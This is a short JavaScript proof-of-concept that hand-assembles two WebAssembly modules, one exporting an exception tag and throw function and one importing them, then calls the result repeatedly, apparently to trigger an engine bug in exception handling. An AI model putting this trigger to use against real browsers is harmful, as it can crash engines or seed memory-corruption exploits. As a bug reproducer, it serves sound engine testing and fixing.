function poc() {
  const lib_bytes = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 7, 22, 2, 3, 116, 97, 103, 4, 0, 0, 8, 116, 104, 114, 111, 119, 95, 102, 110, 0, 0, 10, 6, 1, 4, 0, 8, 0, 11]);
  const main_bytes = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 1, 127, 0, 2, 33, 2, 3, 108, 105, 98, 3, 116, 97, 103, 4, 0, 0, 3, 108, 105, 98, 8, 116, 104, 114, 111, 119, 95, 102, 110, 0, 0, 3, 2, 1, 0, 7, 8, 1, 4, 116, 101, 115, 116, 0, 1, 10, 15, 1, 13, 0, 6, 127, 16, 0, 0, 11, 7, 0, 5, 11]);

  const lib_module = new WebAssembly.Module(lib_bytes);
  const lib_instance = new WebAssembly.Instance(lib_module);

  const imports = {
    lib: lib_instance.exports
  };

  const main_module = new WebAssembly.Module(main_bytes);
  const main_instance = new WebAssembly.Instance(main_module, imports);

  const test = main_instance.exports.test;

  for (let i = 0; i < 100; i++) {
    try {
      test();
    } catch (e) {}
  }

  try {
    test();
  } catch (e) {}
}
poc();